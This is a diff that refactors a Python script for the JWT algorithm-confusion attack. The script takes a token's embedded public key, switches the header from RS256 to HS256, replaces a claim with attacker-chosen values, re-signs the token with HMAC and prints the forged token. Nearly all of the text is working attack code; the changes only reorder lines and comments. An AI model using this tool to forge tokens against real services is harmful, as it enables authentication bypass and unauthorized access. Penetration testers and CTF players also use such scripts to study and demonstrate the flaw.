@@ -35,11 +35,12 @@ encoded_header = token_parts[0]
 encoded_payload = token_parts[1]
 encoded_signature = token_parts[2] #dont need this
 
+#Decode jwt token parts
 decoded_header = base64.urlsafe_b64decode(encoded_header).decode('UTF-8')
-
-#Pull public key from returned jwt payload
 decoded_payload = base64.urlsafe_b64decode(encoded_payload).decode('UTF-8')
 decoded_payload_json = json.loads(decoded_payload)
+
+#Pull public key from returned jwt payload
 public_key = decoded_payload_json.get('pk')
 
 #Removes extra claims from payload for troubleshooting
@@ -60,31 +61,31 @@ print(Fore.GREEN + "-------------------------------------------NEW TOKEN--------
 
 #Create new header (change from RS256 -> HS256)
 header = '{"alg":"HS256","typ":"JWT"}'
+headerEncodedBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
+encodedHeader = str(headerEncodedBytes, "utf-8").rstrip("=")
+
+#Print new header
 print(Fore.YELLOW + "NEW HEADER: " + Fore.RESET)
 print(header + "\n")
 print(Fore.GREEN + "ENCODED: " + Fore.RESET)
-headerEncodedBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
 print(headerEncodedBytes)
 print()
 
-#print(headerEncodedBytes)
-encodedHeader = str(headerEncodedBytes, "utf-8").rstrip("=")
-
 #Create new payload with claim replaced by user input (key and value)
-claim = args.claim_key
-decoded_payload_json[claim] = args.claim_value
+decoded_payload_json[args.claim_key] = args.claim_value
 
 payload = json.dumps(decoded_payload_json)
 payloadEncodedBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
 encodedPayload = str(payloadEncodedBytes, "utf-8").rstrip("=")
 
+#Print new payload data
 print(Fore.YELLOW + "NEW PAYLOAD: " + Fore.RESET)
 print(payload + "\n")
 print(Fore.GREEN + "ENCODED PAYLOAD: " + Fore.RESET)
 print(payloadEncodedBytes)
 print()
 
-#Create new token
+#Build new token
 newToken = (encodedHeader + "." + encodedPayload)
 
 #Create new signature
@@ -96,8 +97,9 @@ sig = base64.urlsafe_b64encode(
 print(Fore.GREEN + "ENCODED SINGATURE: " + Fore.RESET)
 print(sig + "\n")
 
-#Create new token
+#Sign new token
 newToken = newToken + "." + sig
 
+#Print new token
 print(Fore.YELLOW + "NEW TOKEN: " + Fore.RESET)
 print(newToken)
